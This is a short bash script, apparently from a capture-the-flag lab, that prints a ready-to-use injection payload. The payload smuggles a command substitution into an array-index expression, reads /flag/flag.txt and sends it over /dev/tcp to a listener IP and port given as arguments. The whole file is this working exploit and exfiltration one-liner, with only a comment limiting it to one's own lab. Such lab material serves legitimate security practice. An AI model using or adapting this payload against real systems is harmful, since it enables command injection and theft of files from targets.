#!/usr/bin/env bash
# Reconstructed from preserved evidence. Execute only in your own CTF lab.
# Usage: ./payload_example.sh <listener-IP> <listener-port>
set -eu
if [ "$#" -ne 2 ]; then echo "Usage: $0 <listener-IP> <listener-port>" >&2; exit 2; fi
printf 'x[$(cat /flag/flag.txt > /dev/tcp/%s/%s)]\n' "$1" "$2"
